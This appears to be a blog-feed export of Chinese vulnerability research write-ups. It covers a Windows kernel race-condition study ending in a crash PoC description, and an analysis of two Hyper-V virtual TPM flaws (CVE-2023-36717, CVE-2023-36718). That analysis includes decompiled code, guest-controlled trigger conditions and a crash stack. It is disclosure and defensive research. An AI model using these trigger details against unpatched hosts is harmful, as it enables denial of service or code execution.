f0c\u7528\u6237\u7f13\u51b2\u533a\u4e2d\u504f\u79fb\u91cf584\u4e2a\u5b57\u8282\u5904\u5e94\u5f53\u662f\u4e00\u4e2a\u5408\u6cd5\u7684\u6307\u9488\uff0c\u624d\u80fd\u901a\u8fc7\u6d88\u606f\u961f\u5217\u9a71\u52a8\u7a0b\u5e8f\u7684\u53c2\u6570\u68c0\u67e5\u3002\u5728\u6ee1\u8db3\u8fd9\u4e9b\u7ea6\u675f\u6761\u4ef6\u7684\u60c5\u5f62\u4e0b\uff0cPoC\u7a0b\u5e8f\u542f\u52a8\u4e24\u4e2a\u7ebf\u7a0b\uff0c\u4e00\u4e2a\u7528\u4e8e\u53d1\u9001IoControl\u8c03\u7528\uff0c\u53e6\u4e00\u4e2a\u5219\u4fee\u6539\u7528\u6237\u7f13\u51b2\u533a\u4e2d\u504f\u79fb\u91cf592\u4e2a\u5b57\u8282\u5904\u7684\u503c\u4e3a\u8f83\u5927\u503c\u3002\u901a\u8fc7\u4eba\u5de5\u6784\u9020\u53c2\u6570\u5e76\u7f16\u5199PoC\u7a0b\u5e8f\u53d1\u8d77IoControl\u8bf7\u6c42\uff0c\u53ef\u4ee5\u6210\u529f\u5730\u4f7f\u5185\u6838\u5d29\u6e83\uff0c\u5982\u56fe9\u3001\u56fe10\u6240\u793a\u3002\\n\\n ![](./4d97120f-d70c-474a-a987-f154eb51be9c.png)\\n\\n*\u56fe9\uff1a\u6f0f\u6d1e\u5bfc\u81f4\u84dd\u5c4f\uff0c\u539f\u56e0\u4e3aBAD_POOL_CALLER*\\n\\n ![](./6b6ab504-db0a-42e8-bbf3-3748c5c706b5.png)\\n\\n*\u56fe10\uff1aWinDbg\u89c2\u5bdf\u89e6\u53d1\u6f0f\u6d1e\u7684\u8c03\u7528\u6808\uff0c\u4e0e\u9884\u671f\u7684\u76f8\u540c*\\n\\n## \u56db\u3001\u6f0f\u6d1e\u603b\u7ed3\\n\\n\u5728\u672c\u7ae0\u4e2d\uff0c\u7b14\u8005\u5c06\u6982\u62ecWindows\u5185\u6838\u7ade\u6001\u6761\u4ef6\u6f0f\u6d1e\u7684\u4e00\u4e9b\u6a21\u5f0f\uff0c\u5e76\u8bf4\u660e\u5bf9\u6f0f\u6d1e\u7684\u5206\u6790\u5982\u4f55\u6307\u5bfc\u6a21\u7cca\u6d4b\u8bd5\u65b9\u6cd5\u6216\u8005\u5f00\u5c55\u76f8\u5173\u7684\u7814\u7a76\u5de5\u4f5c\u3002\\n\\n\u5728\u7814\u7a76\u4e2d\u89c2\u5bdf\u5230\uff0c\u8fd9\u4e9b\u7ade\u6001\u6761\u4ef6\u6f0f\u6d1e\u7684\u53d1\u73b0\u7684\u65f6\u95f4\u8303\u56f4\u4ece2018\u5e74\u81f32023\u5e74\uff0c\u7cfb\u7edf\u7248\u672c\u8de8\u8d8aWindows 7\u81f3Windows 11\u3002\u5176\u4e2d\uff0c\u6d88\u606f\u961f\u5217\u9a71\u52a8\u7a0b\u5e8f\u4e2d\u7684\u6f0f\u6d1e\uff0c\u5df2\u7ecf\u5b58\u5728\u8d85\u8fc710\u5e74\u7684\u65f6\u95f4\u624d\u88ab\u53d1\u73b0\u3002\u8be5\u9a71\u52a8\u7a0b\u5e8f\u662fWindows\u7684\u53ef\u9009\u529f\u80fd\uff0c\u9ed8\u8ba4\u5e76\u672a\u5f00\u542f\uff0c\u53ef\u4ee5\u63a8\u6d4b\u6b64\u524d\u7684\u5f88\u957f\u65f6\u95f4\u5185\u4e5f\u6ca1\u6709\u88ab\u5b89\u5168\u7814\u7a76\u4eba\u5458\u6240\u6ce8\u610f\u3002\u4e8b\u5b9e\u4e0a\uff0cWindows\u7cfb\u7edf\u4e2d\u5b58\u5728\u5927\u91cf\u7684\u8001\u65e7\u4ee3\u7801\uff0c\u5b83\u4eec\u53ef\u80fd\u5e76\u672a\u7ecf\u8fc7\u5145\u5206\u7684\u6d4b\u8bd5\uff0c\u56e0\u6b64\u5305\u542b\u6f5c\u5728\u7684\u5b89\u5168\u6f0f\u6d1e\u3002\\n\\n\u53d1\u73b0\u6f0f\u6d1e\u6240\u5904\u7684\u6a21\u5757\u4e5f\u5177\u6709\u591a\u6837\u6027\u3002\u9664\u53bbWindows\u5185\u6838ntoskrnl.exe\u5916\uff0c\u8fd8\u6709\u76f8\u5f53\u90e8\u5206\u7684\u6f0f\u6d1e\u5b58\u5728\u4e8eWindows\u7684\u56fe\u5f62\u5b50\u7cfb\u7edf\u548c\u5185\u6838\u9a71\u52a8\u7a0b\u5e8f\u4e2d\u3002\u89e6\u53d1\u8fd9\u4e9b\u6f0f\u6d1e\u7684\u65b9\u6cd5\u4e5f\u5404\u4e0d\u76f8\u540c\uff0c\u5305\u62ecntoskrnl\u7cfb\u7edf\u8c03\u7528\u3001win32\u7cfb\u7edf\u8c03\u7528\u548cIoControl\u8c03\u7528\u7b49\u3002\\n\\n\u6839\u636e\u5bf9\u9a71\u52a8\u7a0b\u5e8f\u4e2d\u6240\u5b58\u5728\u7684\u7ade\u6001\u6761\u4ef6\u6f0f\u6d1e\u7684\u89c2\u5bdf\uff0c\u5b83\u4eec\u5f80\u5f80\u53ef\u4ee5\u901a\u8fc7\u591a\u7ebf\u7a0b\u540c\u65f6\u53d1\u8d77IoControl\u8c03\u7528\u6765\u89e6\u53d1\uff0c\u4f46IoControl\u7684\u53c2\u6570\u5fc5\u987b\u901a\u8fc7\u4e25\u683c\u7684\u68c0\u67e5\u624d\u80fd\u4f7f\u9a71\u52a8\u7a0b\u5e8f\u7684\u63a7\u5236\u6d41\u5230\u8fbe\u6f0f\u6d1e\u70b9\u3002\u7279\u522b\u5730\uff0c\u5bf9CVE-2023-21537\u6f0f\u6d1e\u7684\u7814\u7a76\u4f53\u73b0\u51fa\uff0c\u901a\u8fc7\u4eba\u5de5\u65b9\u6cd5\u6765\u89e6\u53d1\u6f0f\u6d1e\u9700\u8981\u5927\u91cf\u7684\u4e13\u5bb6\u77e5\u8bc6\uff0c\u5e76\u4e14\u6784\u9020\u53c2\u6570\u3001\u8c03\u8bd5PoC\u7a0b\u5e8f\u7684\u6548\u7387\u8f83\u4f4e\u3002\u8fd9\u610f\u5473\u7740\uff0c\u5982\u679c\u8981\u5f00\u5c55\u81ea\u52a8\u5316\u6a21\u7cca\u6d4b\u8bd5\uff0c\u5fc5\u987b\u901a\u8fc7\u9759\u6001\u5206\u6790\u6216\u7b26\u53f7\u6267\u884c\u7b49\u65b9\u5f0f\u4ece\u9a71\u52a8\u7a0b\u5e8f\u4e2d\u63d0\u53d6\u4fe1\u606f\uff0c\u624d\u80fd\u5bf9\u5de8\u5927\u7684\u8f93\u5165\u53c2\u6570\u7a7a\u95f4\u8fdb\u884c\u5212\u5206\uff0c\u63d0\u9ad8\u6d4b\u8bd5\u7684\u6548\u7387\u3002\u5426\u5219\uff0c\u6a21\u7cca\u6d4b\u8bd5\u53ef\u80fd\u65e0\u6cd5\u5230\u8fbe\u66f4\u6df1\u5c42\u7684\u4ee3\u7801\u903b\u8f91\u4e2d\uff0c\u6548\u679c\u4e0a\u4e5f\u5c06\u65e0\u6cd5\u8fbe\u5230\u4eba\u5de5\u6f0f\u6d1e\u6316\u6398\u7684\u6548\u679c\u3002\\n\\n\u6b64\u5916\uff0c\u7814\u7a76\u4e2d\u8fd8\u53d1\u73b0\uff0c\u5177\u4f53\u6f0f\u6d1e\u7c7b\u578b\u4e3b\u8981\u5305\u62ecUAF\u3001OOB\u548cDouble fetch\u8fd9\u4e09\u7c7b\u3002\u5176\u4e2d\uff0cUAF\u6f0f\u6d1e\u6570\u91cf\u8f83\u591a\u3002\u5bf9\u4e8e\u7ade\u6001\u6761\u4ef6\u5bfc\u81f4\u7684UAF\u6f0f\u6d1e\uff0c\u5f80\u5f80\u9700\u8981\u5728\u7279\u5b9a\u7684\u65f6\u95f4\u7a97\u53e3\u5185\u89e6\u53d1\uff0c\u56e0\u6b64\u5373\u4f7f\u6267\u884c\u4e86\u6f0f\u6d1e\u4ee3\u7801\uff0c\u4e5f\u4e0d\u4e00\u5b9a\u80fd\u591f\u76f4\u63a5\u4ea7\u751f\u5d29\u6e83\u3002\u5728\u5b9e\u9645\u7684\u6d4b\u8bd5\u4e2d\uff0cPoC\u7a0b\u5e8f\u4e5f\u5f80\u5f80\u9700\u8981\u8fd0\u884c\u7ea6\u6570\u79d2\u5230\u6570\u5341\u79d2\u7684\u65f6\u95f4\u624d\u80fd\u8d62\u5f97\u7ade\u6001\u6761\u4ef6\u3002\u56e0\u6b64\uff0c\u8981\u81ea\u52a8\u5316\u5730\u6316\u6398\u6b64\u7c7b\u6f0f\u6d1e\uff0c\u5fc5\u987b\u5bf9\u5185\u6838\u6001\u7684\u5185\u5b58\u8bbf\u95ee\u8fdd\u4f8b\u884c\u4e3a\u8fdb\u884c\u76d1\u6d4b\uff0c\u4e5f\u5373\u4e3a\u6a21\u7cca\u6d4b\u8bd5\u5668\u90e8\u7f72\u5bf9\u5e94\u7684Sanitizer\u3002\\n\\n\u7531\u4e8e\u7ade\u6001\u6761\u4ef6\u6f0f\u6d1e\u7684\u51fa\u73b0\u4f34\u968f\u7740\u7ebf\u7a0b\u4ea4\u9519\u7684\u968f\u673a\u6027\uff0c\u5176\u76f8\u6bd4\u4e8e\u901a\u8fc7\u987a\u5e8f\u7684\u7cfb\u7edf\u8c03\u7528\u5e8f\u5217\u6765\u6d4b\u8bd5\u5185\u6838\u66f4\u4e3a\u590d\u6742\u3002\u76ee\u524d\u5b66\u672f\u754c\u5bf9\u5185\u6838\u7ade\u6001\u6761\u4ef6\u6f0f\u6d1e\u6316\u6398\u7684\u7814\u7a76\u5f80\u5f80\u9488\u5bf9Linux\u7b49\u5f00\u6e90\u64cd\u4f5c\u7cfb\u7edf\uff0c\u800c\u5728Windows\u8fd9\u4e00\u95ed\u6e90\u76ee\u6807\u4e0a\uff0c\u8fd8\u6ca1\u6709\u8bde\u751f\u6210\u719f\u7684\u7ade\u6001\u6761\u4ef6\u6f0f\u6d1e\u6316\u6398\u5de5\u5177\u3002\\n\\n\u603b\u800c\u8a00\u4e4b\uff0c\u5bf9Windows\u5185\u6838\u7ade\u6001\u6761\u4ef6\u6f0f\u6d1e\u7684\u6316\u6398\u4ecd\u6709\u5f88\u591a\u503c\u5f97\u63a2\u7d22\u7684\u65b9\u5411\uff0c\u671f\u5f85\u672a\u6765\u80fd\u5728\u5b66\u672f\u754c\u548c\u5de5\u4e1a\u754c\u770b\u5230\u66f4\u591a\u7684\u521b\u65b0\u6210\u679c\uff0c\u5e0c\u671b\u672c\u6587\u80fd\u8d77\u5230\u629b\u7816\u5f15\u7389\u7684\u6548\u679c\u3002\\n\\n## \u4e94\u3001\u4f5c\u8005\u4ecb\u7ecd\\n\\nID\uff1a\u7c73\u7c73\\n\\n\u4e2a\u4eba\u4ecb\u7ecd\uff1a\u5929\u5de5\u5b9e\u9a8c\u5ba4\u5b9e\u4e60\u751f\uff1b\u73b0\u5c31\u8bfb\u4e8e\u6e05\u534e\u5927\u5b66\u7f51\u7edc\u7814\u7a76\u9662\uff0c\u4ece\u4e8b Windows \u5185\u6838\u6f0f\u6d1e\u6316\u6398\u7814\u7a76\u3002"},{"id":"microsoft-hyper-vtpm","metadata":{"permalink":"/blog/microsoft-hyper-vtpm","editUrl":"https://github.com/TianGongLab/poc_docs/tree/main/blog/2023-10-25-microsoft-hyper-vtpm/index.md","source":"@site/blog/2023-10-25-microsoft-hyper-vtpm/index.md","title":"Microsoft Hyper-V \u865a\u62df TPM \u8bbe\u5907\u6f0f\u6d1e\u5206\u6790","description":"\u4e00\u3001\u6f0f\u6d1e\u63cf\u8ff0","date":"2023-10-25T00:00:00.000Z","formattedDate":"2023\u5e7410\u670825\u65e5","tags":[{"label":"Microsoft","permalink":"/blog/tags/microsoft"},{"label":"Hyper-V","permalink":"/blog/tags/hyper-v"},{"label":"TPM","permalink":"/blog/tags/tpm"}],"readingTime":7.18,"hasTruncateMarker":true,"authors":[{"name":"HongZhenhao","key":"hongzhenhao"}],"frontMatter":{"slug":"microsoft-hyper-vtpm","title":"Microsoft Hyper-V \u865a\u62df TPM \u8bbe\u5907\u6f0f\u6d1e\u5206\u6790","authors":["hongzhenhao"],"tags":["Microsoft","Hyper-V","TPM"]},"prevItem":{"title":"Windows\u5185\u6838\u7ade\u6001\u6761\u4ef6\u6f0f\u6d1e\u7814\u7a76","permalink":"/blog/research-on-windows-kernel-race-condition-vulnerabilities"},"nextItem":{"title":"CVE-2023-0179 Linux\u5185\u6838\u63d0\u6743","permalink":"/blog/cve-2023-0179-linux"}},"content":"## \u4e00\u3001\u6f0f\u6d1e\u63cf\u8ff0\\r\\n\\r\\n2023\u5e7410\u6708\u5fae\u8f6f\u53d1\u5e03\u7684\u5b89\u5168\u66f4\u65b0\u4e2d\uff0c\u4fee\u590d\u4e862\u4e2a\u7531\u7b14\u8005\u62a5\u9001\u7684Hyper-V\u865a\u62dfTPM\u8bbe\u5907\u6f0f\u6d1e\u3002\u672c\u6b21\u4fee\u590d\u7684Hyper-V\u865a\u62dfTPM\u7ec4\u4ef6\u7684\u6f0f\u6d1e\u53ef\u4ee5\u901a\u8fc7\u8fdc\u7a0b\u8bbf\u95ee\u865a\u62df\u673a\u7684\u65b9\u5f0f\u89e6\u53d1\u6f0f\u6d1e\uff0c\u9020\u6210\u5bbf\u4e3b\u673a\u62d2\u7edd\u670d\u52a1\u6216\u8005\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff0c\u5bf9\u5bbf\u4e3b\u673a\u4e0a\u7684\u5176\u4ed6\u865a\u62df\u673a\u6216\u4e1a\u52a1\u9020\u6210\u635f\u5931\u3002\\r\\n\\r\\n\x3c!-- truncate --\x3e\\r\\n\\r\\n## \u4e8c\u3001\u80cc\u666f\u4ecb\u7ecd\\r\\n\\r\\nHyper-V\u7684\u865a\u62dfTPM\u7ec4\u4ef6\u65e8\u5728\u4e3a\u865a\u62df\u673a\u63d0\u4f9b\u6a21\u62df\u7684TPM\u8bbe\u5907\uff0c\u865a\u62dfTPM\u8bbe\u5907\u53ef\u4ee5\u4e3a\u4f9d\u8d56TPM\u8bbe\u5907\u7684\u670d\u52a1\u6216\u8005\u64cd\u4f5c\u7cfb\u7edf\uff08\u4f8b\u5982Windows 11\uff09\u63d0\u4f9b\u652f\u6301\u3002\\r\\n\\r\\n\u6f0f\u6d1e\u4f4d\u4e8e`vmsp.exe`\u8fdb\u7a0b\u4e2d\u7684`TpmEngUM.dll`\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\uff0c\u672c\u6b21\u4ecb\u7ecd\u7684\u4e24\u4e2a\u865a\u62dfTPM\u7ec4\u4ef6\u7684\u6f0f\u6d1e\u5c31\u662f\u4f4d\u4e8e`TpmEngUM.dll`\u8fd9\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u3002\\r\\n\\r\\n`vmsp.exe`\u8fdb\u7a0b\u4e0e`vmwp.exe`\u8fdb\u7a0b\u76f8\u4f3c\uff0c\u90fd\u662f\u4e00\u4e2a\u865a\u62df\u673a\u5b9e\u4f8b\u542f\u52a8\u4e00\u4e2a\u8fdb\u7a0b\u3002\u4f46\u662f\u4e0d\u540c\u7684\u662f`vmsp.exe`\u8fdb\u7a0b\u662f\u9694\u79bb\u7528\u6237\u6a21\u5f0f(IUM)\u8fdb\u7a0b\uff0c\u4e5f\u5c31\u662f\u8bf4`vmsp.exe`\u8fdb\u7a0b\u65e0\u6cd5\u5728windows\u7528\u6237\u6001\u4e0b\u88ab\u6b63\u5e38attach\u3002\u6240\u4ee5\u5728\u8c03\u8bd5\u4e0a\uff0c\u9488\u5bf9`vmsp.exe`\u8fdb\u7a0b\u7684\u8c03\u8bd5\u5c31\u9700\u8981\u989d\u5916\u7684\u201c\u624b\u811a\u201d\uff0c\u8fd9\u91cc\u6211\u4eec\u5f15\u7528Quarkslab\u535a\u5ba2\u7684\u6587\u7ae0\uff08https://blog.quarkslab.com/debugging-windows-isolated-user-mode-ium-processes.html\uff09\uff0c\u611f\u5174\u8da3\u7684\u8bfb\u8005\u53ef\u4ee5\u53bb\u4e86\u89e3\u5e76\u5b9e\u8df5\u4e0b\uff0c\u8fd9\u91cc\u4e0d\u505a\u8ba8\u8bba\u3002\\r\\n\\r\\n## \u4e09\u3001\u73af\u5883\u642d\u5efa\\r\\n\\r\\n\u865a\u62dfTPM\u7ec4\u4ef6\u6f0f\u6d1e\u7684\u89e6\u53d1\u9700\u8981\u5728Hyper-V\u865a\u62df\u673a\u8bbe\u7f6e\u4e2d\u7684\u201c\u5b89\u5168\u201d\u8bbe\u7f6e\u4e2d\uff0c\u52fe\u9009\u201c\u542f\u7528\u53d7\u4fe1\u4efb\u7684\u5e73\u53f0\u6a21\u5757\u201d\u3002\\r\\n\\r\\n ![](./0c7d620e-97ff-45cc-a12f-b4c66a317e2a.png)\\r\\n\\r\\n## \u56db\u3001\u6f0f\u6d1e\u5206\u6790CVE-2023-36717\\r\\n\\r\\n\u8be5\u6f0f\u6d1e\u662f\u4e00\u4e2a\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e\uff0c\u5f53\u8fd9\u4e2a\u6f0f\u6d1e\u88ab\u89e6\u53d1\u65f6\u4f1a\u5bfc\u81f4\u5bbf\u4e3b\u673a`vmsp.exe`\u8fdb\u7a0b\u8fdb\u5165\u6b7b\u5faa\u73af\uff0c\u5e76\u5360\u7528\u5927\u91cfCPU\u8ba1\u7b97\u8d44\u6e90\u3002\u7531\u4e8e`vmsp.exe`\u8fdb\u7a0b\u662fIUM\u8fdb\u7a0b\uff0c\u6240\u4ee5\u5f53\u6f0f\u6d1e\u88ab\u89e6\u53d1\u540e\uff0c\u7ba1\u7406\u5458\u65e0\u6cd5\u4ece\u7528\u6237\u6001\u7ed3\u675f\u6389\u8fd9\u4e2a\u8fdb\u7a0b\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u9664\u975e\u91cd\u542f\u5bbf\u4e3b\u673a\u64cd\u4f5c\u7cfb\u7edf\u5426\u5219\u8ba1\u7b97\u8d44\u6e90\u4e00\u76f4\u65e0\u6cd5\u88ab\u91ca\u653e\u3002\\r\\n\\r\\n\u8fd9\u4e2a\u6f0f\u6d1e\u4f4d\u4e8e`TpmEngUM!TPM2_ECDH_KeyGen`\u51fd\u6570\u4e2d\u3002\\r\\n\\r\\n```javascript\\r\\n__int64 __fastcall TPM2_ECDH_KeyGen(unsigned int *a1, __int64 a2)\\r\\n{\\r\\n  OBJECT *v3; // rax\\r\\n  OBJECT *v4; // rsi\\r\\n  unsigned int v5; // eax\\r\\n  unsigned int v6; // ebx\\r\\n  unsigned __int16 v8[28]; // [rsp+20h] [rbp-58h] BYREF\\r\\n\\r\\n  v3 = ObjectGet(*a1);\\r\\n  v4 = v3;\\r\\n  if ( v3->public_type != 0x23\\r\\n    || (v3->public_objectAttributes & 0x10000) != 0\\r\\n    || (v3->public_objectAttributes & 0x20000) == 0 )\\r\\n  {\\r\\n    return 0x19Ci64;\\r\\n  }\\r\\n  while ( !(unsigned __int16)cpri__GetEphemeralEcc(\\r\\n                               (unsigned __int16 *)(a2 + 104),\\r\\n                               v8,\\r\\n                               v4->public_parameters_Detail_keyBits) )\\r\\n  {\\r\\n    *(_WORD *)(a2 + 0x66) = TPMS_ECC_POINT_Marshal((_BYTE *)(a2 + 104), 0i64, 0i64);\\r\\n    v5 = CryptEccPointMultiply(\\r\\n           (_WORD *)(a2 + 2),\\r\\n           v4->public_parameters_Detail_keyBits,\\r\\n           v8,\\r\\n           (__int64)&v4->public_unique_ecc_x);\\r\\n    v6 = v5;\\r\\n    if ( v5 == 0xA7 )\\r\\n      break;\\r\\n    if ( v5 != 0x154 )\\r\\n      goto LABEL_9;\\r\\n  }\\r\\n  v6 = 156;\\r\\nLABEL_9:\\r\\n  if ( !v6 )\\r\\n    *(_WORD *)a2 = TPMS_ECC_POINT_Marshal((_BYTE *)(a2 + 2), 0i64, 0i64);\\r\\n  return v6;\\r\\n}\\r\\n```\\r\\n\\r\\n\u5728`TpmEngUM!TPM2_ECDH_KeyGen`\u51fd\u6570\u4e2d\uff0c`v4->public_unique_ecc_x`\u6210\u5458\u53ef\u4ee5\u4eceGuest\u4e2d\u88ab\u63a7\u5236\uff0c\u5982\u679c`v4->public_unique_ecc_x`\u6210\u5458\u662f\u4e00\u4e2aNULL ECC Point\u7684\u60c5\u51b5\u4e0b\uff08`TPM2B_ECC_PARAMETER.size`\u4e3a0x00,\u5e76\u4e14`TPM2B_ECC_PARAMETER.buffer`\u6570\u7ec4\u88ab0\u586b\u5145\uff09\uff0c`TpmEngUM!CryptEccPointMultiply`\u4f1a\u4e00\u76f4\u8fd4\u56de\u9519\u8bef\u78010x154\uff0c\u5e76\u4e0d\u505c\u7684\u5faa\u73af\u8c03\u7528`TpmEngUM!CryptEccPointMultiply`\u51fd\u6570\uff0c\u6700\u7ec8\u9020\u6210vmsp.exe\u8fdb\u7a0b\u6b7b\u5faa\u73af\uff0c\u5bfc\u81f4\u5bbf\u4e3b\u673a\u62d2\u7edd\u670d\u52a1\u3002\\r\\n\\r\\n## \u4e94\u3001\u6f0f\u6d1e\u5206\u6790CVE-2023-36718\\r\\n\\r\\n\u8be5\u6f0f\u6d1e\u662f\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u5f53\u8fd9\u4e2a\u6f0f\u6d1e\u88ab\u89e6\u53d1\u65f6\u4f1a\u4f7f\u7528\u672a\u521d\u59cb\u5316\u7684\u6808\u7a7a\u95f4\u53d8\u91cf\u3002\u8fd9\u4e2a\u6f0f\u6d1e\u4f4d\u4e8e`TpmEngUM!CryptSecretEncrypt`\u51fd\u6570\u4e2d\u3002\\r\\n\\r\\n```javascript\\r\\n__int64 __fastcall CryptSecretEncrypt(unsigned int a1, _BYTE *a2_plabel, __int64 a3, __int16 *a4)\\r\\n{\\r\\n  unsigned int v7; // ebx\\r\\n  OBJECT *v8_obj; // rax\\r\\n  OBJECT *v9_obj; // rdi\\r\\n  unsigned __int16 DigestSize; // ax\\r\\n  unsigned __int16 public_parameters_Detail_keyBits; // cx\\r\\n  __int16 public_nameAlg; // cx\\r\\n  void *v14; // [rsp+40h] [rbp-C0h] BYREF\\r\\n  __int16 v15[28]; // [rsp+48h] [rbp-B8h] BYREF\\r\\n  __int16 v16[56]; // [rsp+80h] [rbp-80h] BYREF\\r\\n  __int16 v17_Z_eccpointaftermul[56]; // [rsp+F0h] [rbp-10h] BYREF\\r\\n\\r\\n  v7 = 0;\\r\\n  v8_obj = ObjectGet(a1);\\r\\n  v9_obj = v8_obj;\\r\\n\\r\\n......\\r\\n\\r\\n  DigestSize = cpri__GetDigestSize(v8_obj->public_nameAlg);\\r\\n  *(_WORD *)a3 = DigestSize;\\r\\n  \\r\\n......\\r\\n\\r\\n\\r\\n  if ( v9_obj->public_type == 1 )\\r\\n  {\\r\\n \\r\\n......\\r\\n\\r\\n\\r\\n  }\\r\\n  else\\r\\n  {\\r\\n    if ( v9_obj->public_type != 0x23 )\\r\\n    {\\r\\n\\r\\n......\\r\\n\\r\\n    }\\r\\n    public_parameters_Detail_keyBits = v9_obj->public_parameters_Detail_keyBits;\\r\\n    v14 = a4 + 1;\\r\\n    if ( (unsigned int)cpri__EccIsPointOnCurve(\\r\\n                         public_parameters_Detail_keyBits,\\r\\n                         (__int64)&v9_obj->public_unique_ecc_x) )\\r\\n    {\\r\\n      cpri__GetEphemeralEcc((unsigned __int16 *)v16, (unsigned __int16 *)v15, v9_obj->public_parameters_Detail_keyBits);\\r\\n      *a4 = TPMS_ECC_POINT_Marshal(v16, &v14, 0i64);\\r\\n      if ( (unsigned int)CryptEccPointMultiply(\\r\\n                           v17_Z_eccpointaftermul,\\r\\n                           v9_obj->public_parameters_Detail_keyBits,\\r\\n                           (unsigned __int16 *)v15,\\r\\n                           (__int64)&v9_obj->public_unique_ecc_x) )\\r\\n      {\\r\\n        v7 = 0x9C;\\r\\n      }\\r\\n      else if ( BitIsSet((unsigned __int16)v9_obj->public_nameAlg, (__int64)&g_toTest, 9u) )\\r\\n      {\\r\\n        public_nameAlg = v9_obj->public_nameAlg;\\r\\n        if ( public_nameAlg != 0x10 )\\r\\n          TestAlgorithm(public_nameAlg, 0i64);\\r\\n      }\\r\\n      cpri__KDFe(\\r\\n        v9_obj->public_nameAlg,\\r\\n        (unsigned __int16 *)v17_Z_eccpointaftermul,\\r\\n        a2_plabel,\\r\\n        (unsigned __int16 *)v16,\\r\\n        (unsigned __int16 *)&v9_obj->public_unique_ecc_x,\\r\\n        8 * *(unsigned __int16 *)a3,\\r\\n        (_BYTE *)(a3 + 2));\\r\\n    }\\r\\n    else\\r\\n    {\\r\\n      return 0x9C;\\r\\n    }\\r\\n  }\\r\\n  return v7;\\r\\n}\\r\\n```\\r\\n\\r\\n\u4e0a\u9762\u4ee3\u7801\u4e2d\u7684`v17_Z_eccpointaftermul`\u662f\u4e00\u4e2a\u6808\u4e0a\u7684\u6570\u7ec4\uff08\u4e5f\u53ef\u80fd\u662f\u4e2a\u7ed3\u6784\u4f53\uff09\uff0c`v17_Z_eccpointaftermul`\u7684\u5927\u5c0f\u662f0x70\u5b57\u8282\u3002\u4ee3\u7801\u4e2d\u7684`v9_obj->public_unique_ecc_x`\u6210\u5458\u53ef\u4ee5\u4eceGuest\u4e2d\u88ab\u63a7\u5236\uff0c\u5f53`v9_obj->public_unique_ecc_x`\u6210\u5458\u662f\u4e00\u4e2aNULL ECC Point\u7684\u60c5\u51b5\u4e0b`\uff08TPM2B_ECC_PARAMETER.size`\u4e3a0x00,\u5e76\u4e14`TPM2B_ECC_PARAMETER.buffer`\u6570\u7ec4\u88ab0\u586b\u5145\uff09\uff0c`TpmEngUM!CryptEccPointMultiply`\u51fd\u6570\u4f1a\u8fd4\u56de\u4e00\u4e2a\u9519\u8bef\u7801\u5e76\u5c06v7\u8bbe\u7f6e\u4e3a0x9C\u3002\\r\\n\\r\\n\u8bbe\u7f6e\u5b8cv7\u7684\u503c\u4e4b\u540e\uff0c\u7a0b\u5e8f\u7ee7\u7eed\u8d70\u5230\u8981\u8c03\u7528`TpmEngUM!cpri__KDFe`\u51fd\u6570\u8fd9\u91cc\uff0c\u6b64\u65f6`v17_Z_eccpointaftermul`\u662f\u4e00\u4e2a\u6808\u4e0a\u672a\u521d\u59cb\u5316\u7684\u6570\u7ec4\uff0c\u5e76\u4f5c\u4e3a`TpmEngUM!cpri__KDFe`\u51fd\u6570\u7684\u7b2c\u4e8c\u53c2\u6570\u8fdb\u5165\u5230\u4e4b\u540e\u7684`TpmEngUM!cpri__KDFe`\u51fd\u6570\u7684\u4ee3\u7801\u6d41\u7a0b\u91cc\u3002\\r\\n\\r\\n\u5728`TpmEngUM!cpri__KDFe`\u51fd\u6570\u540e\u7eed\u7684\u4ee3\u7801\u6d41\u7a0b\u4e2d\uff0c\u4f7f\u7528\u4e86\u672a\u521d\u59cb\u5316\u7684\u6808\u4e0a\u7684\u6570\u636e\uff0c\u5bfc\u81f4\u8d8a\u754c\u8bfb\u6216\u8005\u5185\u5b58\u635f\u574f\u3002\u4e0b\u9762\u662f\u5d29\u6e83\u65f6\u7684\u73b0\u573a\uff1a\\r\\n\\r\\n```javascript\\r\\n(4afc.2f4c): Access violation - code c0000005 (first chance)\\r\\nFirst chance exceptions are reported before any exception handling.\\r\\nThis exception may be expected and handled.\\r\\nTpmEngUM!SymCryptSha512AppendBlocks_ull+0xa7:\\r\\n00007ffb`38d9a42f 4d8b41f0        mov     r8,qword ptr [r9-10h] ds:00000000`00153ffe=????????????????\\r\\n0:000> k\\r\\n # Child-SP          RetAddr           Call Site\\r\\n00 00000000`0014ec80 00007ffb`38d99e01 TpmEngUM!SymCryptSha512AppendBlocks_ull+0xa7\\r\\n01 00000000`0014eed0 00007ffb`38d99e59 TpmEngUM!SymCryptSha512Append+0x95\\r\\n02 00000000`0014ef10 00007ffb`38d87724 TpmEngUM!SymCryptSha384Append+0x9\\r\\n03 00000000`0014ef40 00007ffb`38d66cd7 TpmEngUM!cpri__KDFe+0x1a4\\r\\n04 00000000`0014f110 00007ffb`38d7c7cd TpmEngUM!CryptSecretEncrypt+0x143\\r\\n05 00000000`0014f2c0 00007ffb`38d70a54 TpmEngUM!TPM2_MakeCredential+0x7d\\r\\n06 00000000`0014f340 00007ffb`38d61c54 TpmEngUM!CommandDispatcher+0xa78\\r\\n07 00000000`0014f420 00007ffb`38d61313 TpmEngUM!ExecuteCommand+0x460\\r\\n08 00000000`0014f530 00000001`400c3862 TpmEngUM!VTpmExecuteCommand+0x73\\r\\n```\\r\\n\\r\\n## 